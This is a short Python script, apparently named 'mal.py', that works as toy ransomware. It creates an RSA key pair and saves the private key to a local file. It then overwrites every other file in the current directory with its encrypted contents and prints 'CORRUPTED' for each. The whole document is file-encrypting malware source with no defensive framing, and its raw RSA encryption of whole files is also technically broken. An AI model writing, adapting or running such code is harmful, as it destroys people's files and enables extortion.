import rsa
import os

publicKey, privateKey = rsa.newkeys(512)

#write my key
with open("seckey.pem","wb") as mykey:
	mykey.write(privateKey.save_pkcs1())


files=[]

for i in os.listdir():
	if i=='mal.py' or i=='seckey.pem' or i=='dec.py':
		continue
	if os.path.isfile(i):
		files.append(i)


for i in files:
	with open(i,"r") as targets:
		contents=targets.read()
	with open(i,"wb") as target:
		target.write(rsa.encrypt(contents.encode(),publicKey))
	print("....................CORRUPTED......................")
